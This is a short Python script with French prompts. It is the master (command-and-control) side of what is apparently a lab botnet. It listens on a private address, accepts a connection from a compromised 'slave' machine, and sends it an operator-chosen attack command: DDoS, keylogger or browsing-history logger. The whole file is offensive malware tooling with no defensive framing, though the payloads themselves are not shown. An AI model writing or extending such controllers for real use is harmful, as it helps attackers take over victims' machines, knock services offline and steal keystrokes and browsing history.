import socket as modsocket

def choix_attaque():
    select = int(input("1) DDos \n2)Keylogger \n3)Logger historique \nSélectionnez une option : "))
    while (select<1) or (select>3):
        print("Erreur, faites un choix entre 1 et 3")
        select = int(input("1) DDos \n2)Keylogger \n3)Logger historique \nSélectionnez une option : "))
    if select == 1:
        print("Choix d'attaque : DDoS. Signal envoyé")
        slave.sendall(b"ddos")
    elif select == 2:
        print("Choix d'attaque : Keylogger. Signal envoyé")
        slave.sendall(b"keylogger")
    elif select == 3:
        print("Choix d'attaque : Logger historique. Signal envoyé")
        slave.sendall(b"historique")

server_addr = ("192.168.56.1", 60000)

master = modsocket.socket(modsocket.AF_INET, modsocket.SOCK_STREAM)
master.bind((server_addr))
print("le maître est démarré...")

master.listen()
print("en écoute...")

slave, addr = master.accept()
print("Connection accepted for : ", addr)

choix_attaque()
master.close()






